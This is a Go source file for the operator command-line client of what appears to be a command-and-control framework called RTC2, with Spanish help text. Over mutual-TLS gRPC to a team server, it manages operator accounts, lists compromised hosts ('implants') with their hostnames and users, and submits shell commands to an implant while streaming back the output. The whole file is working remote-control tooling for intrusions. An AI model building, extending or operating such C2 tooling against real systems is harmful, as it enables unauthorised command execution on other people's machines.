package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"os"
	"time"

	"github.com/spf13/cobra"
	adminv1 "github.com/uLl0a/lavianc2/gen/admin/v1"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/protobuf/types/known/emptypb"
)

var (
	serverAddr string
	certFile   string
	keyFile    string
	caFile     string
	conn       *grpc.ClientConn
	client     adminv1.AdminServiceClient
)

func main() {
	rootCmd := &cobra.Command{
		Use:   "rtc2-operator",
		Short: "CLI de operador para RTC2",
		PersistentPreRunE: func(cmd *cobra.Command, args []string) error {
			return connect()
		},
		PersistentPostRun: func(cmd *cobra.Command, args []string) {
			if conn != nil {
				conn.Close()
			}
		},
	}

	rootCmd.PersistentFlags().StringVar(&serverAddr, "server", "localhost:9443", "dirección del team server")
	rootCmd.PersistentFlags().StringVar(&certFile, "cert", "certs/admin.crt", "certificado del operador")
	rootCmd.PersistentFlags().StringVar(&keyFile, "key", "certs/admin.key", "clave privada del operador")
	rootCmd.PersistentFlags().StringVar(&caFile, "ca", "certs/ca.crt", "CA raíz")

	// Comandos
	rootCmd.AddCommand(operatorCmd())
	rootCmd.AddCommand(listenerCmd())
	rootCmd.AddCommand(implantCmd())
	rootCmd.AddCommand(taskCmd())
	rootCmd.AddCommand(buildCmd())

	if err := rootCmd.Execute(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}

func connect() error {
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		return fmt.Errorf("cargar certificado: %w", err)
	}
	caPEM, err := os.ReadFile(caFile)
	if err != nil {
		return fmt.Errorf("leer CA: %w", err)
	}
	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM(caPEM) {
		return fmt.Errorf("CA inválida")
	}
	creds := credentials.NewTLS(&tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:      pool,
		ServerName:   "localhost",
		MinVersion:   tls.VersionTLS13,
	})
	conn, err = grpc.NewClient(serverAddr, grpc.WithTransportCredentials(creds))
	if err != nil {
		return fmt.Errorf("conectar: %w", err)
	}
	client = adminv1.NewAdminServiceClient(conn)
	return nil
}

func operatorCmd() *cobra.Command {
	cmd := &cobra.Command{Use: "operator", Short: "Gestión de operadores"}

	create := &cobra.Command{
		Use:   "create",
		Short: "Crear un operador",
		RunE: func(cmd *cobra.Command, args []string) error {
			username, _ := cmd.Flags().GetString("username")
			password, _ := cmd.Flags().GetString("password")
			role, _ := cmd.Flags().GetString("role")
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			defer cancel()
			op, err := client.CreateOperator(ctx, &adminv1.CreateOperatorRequest{
				Username: username,
				Password: password,
				Role:     role,
			})
			if err != nil {
				return err
			}
			fmt.Printf("Operador creado: %s (ID: %s)\n", op.Username, op.Id)
			return nil
		},
	}
	create.Flags().String("username", "", "nombre de usuario (requerido)")
	create.Flags().String("password", "", "contraseña (requerido)")
	create.Flags().String("role", "operator", "rol: admin, operator, viewer")
	_ = create.MarkFlagRequired("username")
	_ = create.MarkFlagRequired("password")

	list := &cobra.Command{
		Use:   "list",
		Short: "Listar operadores",
		RunE: func(cmd *cobra.Command, args []string) error {
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			defer cancel()
			resp, err := client.ListOperators(ctx, &emptypb.Empty{})
			if err != nil {
				return err
			}
			for _, op := range resp.Operators {
				fmt.Printf("%s\t%s\t%s\n", op.Id[:8], op.Username, op.Role)
			}
			return nil
		},
	}
	cmd.AddCommand(create, list)
	return cmd
}

func implantCmd() *cobra.Command {
	cmd := &cobra.Command{Use: "implant", Short: "Gestión de implantes"}

	list := &cobra.Command{
		Use:   "list",
		Short: "Listar implantes activos",
		RunE: func(cmd *cobra.Command, args []string) error {
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			defer cancel()
			resp, err := client.ListImplants(ctx, &emptypb.Empty{})
			if err != nil {
				return err
			}
			for _, imp := range resp.Implants {
				fmt.Printf("%s\t%s\t%s\t%s\t%s\n",
					imp.SessionKey, imp.Hostname, imp.Username, imp.Os, imp.Status)
			}
			return nil
		},
	}

	shell := &cobra.Command{
		Use:   "shell [session-key] [comando]",
		Short: "Ejecutar comando en un implante",
		Args:  cobra.MinimumNArgs(2),
		RunE: func(cmd *cobra.Command, args []string) error {
			// Resolver session-key a UUID (simplificado: se asume UUID directo)
			ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
			defer cancel()
			task, err := client.SubmitTask(ctx, &adminv1.SubmitTaskRequest{
				ImplantId: args[0],
				Command:   "shell",
				Args:      args[1:],
			})
			if err != nil {
				return err
			}
			fmt.Printf("Tarea enviada: %s\n", task.Id)
			// Stream de eventos
			return streamTask(task.ImplantId)
		},
	}
	cmd.AddCommand(list, shell)
	return cmd
}

func streamTask(implantID string) error {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()
	stream, err := client.StreamTaskEvents(ctx, &adminv1.StreamTaskEventsRequest{ImplantId: implantID})
	if err != nil {
		return err
	}
	for {
		ev, err := stream.Recv()
		if err != nil {
			return err
		}
		fmt.Printf("[%s] %s\n", ev.Status, string(ev.Output))
		if ev.Status == "completed" || ev.Status == "failed" {
			return nil
		}
	}
}
